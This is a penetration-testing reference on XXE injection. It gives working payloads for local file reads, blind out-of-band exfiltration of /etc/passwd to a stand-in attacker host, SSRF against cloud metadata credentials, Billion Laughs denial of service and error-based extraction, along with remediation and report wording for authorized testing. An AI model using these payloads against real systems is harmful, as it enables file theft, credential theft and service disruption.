# XXE (XML External Entity) Testing Notes — Offensive Security Reference

## 1. Root Cause
XXE occurs when an XML parser processes a Document Type Definition (DTD) and resolves externally-defined entities within it, allowing an attacker who controls XML input to define an entity that references a local file, an internal network resource, or a parameter entity used to exfiltrate data — all before the application ever gets to its own business logic. Most modern XML parser libraries disable external entity resolution by default now, but plenty of applications explicitly re-enable it (often to support legitimate DTD-validation use cases) or use older library versions/configurations where it's still on by default.

## 2. Where to Look
Anywhere the application accepts and parses XML:
- Direct API endpoints accepting `Content-Type: application/xml` or `text/xml`
- SOAP web services (XXE is extremely common here since SOAP is XML-native)
- File upload features accepting XML-based formats — this includes formats that *look* like other file types but are XML under the hood: **DOCX, XLSX, PPTX (all are zipped XML)**, SVG, and RSS/Atom feed imports
- "Import from XML" configuration/settings features
- Any XML-RPC endpoint

## 3. Detection & Exploitation

**Basic file-read XXE:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```
If the parsed value appears in the response, this confirms classic in-band XXE with direct file-read capability.

**Blind XXE (no direct reflection) — Out-of-band exfiltration via parameter entities:**
When the response doesn't echo entity content back, use OOB techniques:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker-collab.com/evil.dtd">
  %xxe;
]>
```
Where `evil.dtd` (hosted on your listener) contains a secondary parameter entity that reads a local file and exfiltrates it via an HTTP request to your server as part of the value:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker-collab.com/?data=%file;'>">
%eval;
%exfil;
```
This confirms and exfiltrates file contents purely via out-of-band callbacks (Burp Collaborator or `interactsh`), essential when the application never reflects parsed XML data back to you.

**XXE-to-SSRF:**
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
```
Same cloud metadata targeting priority as standalone SSRF — XXE is one of the most common *routes into* SSRF, so always chain this check.

**Billion Laughs / XML Bomb (DoS):**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  ... (continued nesting)
]>
<lolz>&lol9;</lolz>
```
Exponential entity expansion consumes memory/CPU disproportionate to the tiny payload size — confirms DoS potential even where file-read/SSRF isn't achievable.

**Error-based XXE (when direct/OOB channels are both blocked):**
Trigger a parser error that includes file content in the error message itself, using a malformed external DTD reference:
```xml
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
```
The resulting "file not found" error often embeds the attempted (and thus leaked) path/content in its message.

## 4. Testing Formats Beyond Raw XML
Don't skip file uploads that are XML *underneath* a different extension:
- **DOCX/XLSX/PPTX** — unzip, inject XXE payload into the relevant internal XML file (e.g., `word/document.xml`), rezip, upload. Many document-processing backends (thumbnail generators, text extractors) parse these without disabling external entities.
- **SVG** — SVG is XML; test image upload features that accept SVG for XXE, in addition to standard SVG-based XSS testing.

## 5. Tools
| Tool | Use |
|---|---|
| **Burp Suite** | Manual payload crafting/testing via Repeater; Collaborator for OOB confirmation |
| **XXEinjector** | Automated XXE exploitation including OOB and blind extraction |
| **docx/xlsx/pptx unzip+rezip (standard zip tools)** | Crafting malicious Office document uploads |

## 6. Checklist
- [ ] Every raw XML-accepting endpoint tested with basic in-band file-read payload
- [ ] Blind/OOB parameter-entity exfiltration tested where no direct reflection exists
- [ ] XXE-to-SSRF tested, including cloud metadata endpoint as top priority
- [ ] Billion Laughs/DoS payload tested for availability impact
- [ ] Error-based extraction attempted if both in-band and OOB channels are blocked
- [ ] Non-obvious XML-based file formats tested (DOCX/XLSX/PPTX/SVG uploads), not just direct XML API endpoints
- [ ] Parser library/version identified where possible to check against known-vulnerable defaults

## 7. Severity Notes
File-read XXE exposing sensitive local files (config files, credentials, `/etc/passwd` as a PoC baseline) → Critical–High. XXE-to-SSRF reaching cloud metadata → Critical. Blind XXE confirmed via OOB but limited practical file-read demonstrated → High. DoS-only (Billion Laughs) with no data exposure → Medium.

## 8. Sample Reporting Language
**Finding title:** XML External Entity (XXE) Injection in Invoice Import Feature Leading to Local File Disclosure

**Description:** The invoice import feature (`POST /api/invoices/import`) parses uploaded XML files without disabling external entity resolution. A crafted XML payload defining an external entity referencing `file:///etc/passwd` resulted in the file's contents being reflected in the application's error response, confirming in-band file-read XXE.

**Impact:** An attacker can read arbitrary files accessible to the application server's file system permissions, including configuration files, source code, and credentials, and can potentially chain this into SSRF against internal services or cloud metadata endpoints.

**Recommendation:** Disable DTD processing and external entity resolution in the XML parser configuration (e.g., `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` for Java-based parsers, or the equivalent safe-parsing configuration for the language/library in use). Apply this configuration globally across every XML parsing entry point in the application, including document-processing pipelines that handle DOCX/XLSX/SVG uploads.

---
*Assumes testing under written authorization. OOB testing requires a listener/callback domain you control — ensure this is disclosed to the client per engagement rules if required, and avoid file-read targets beyond what's needed to demonstrate impact.*
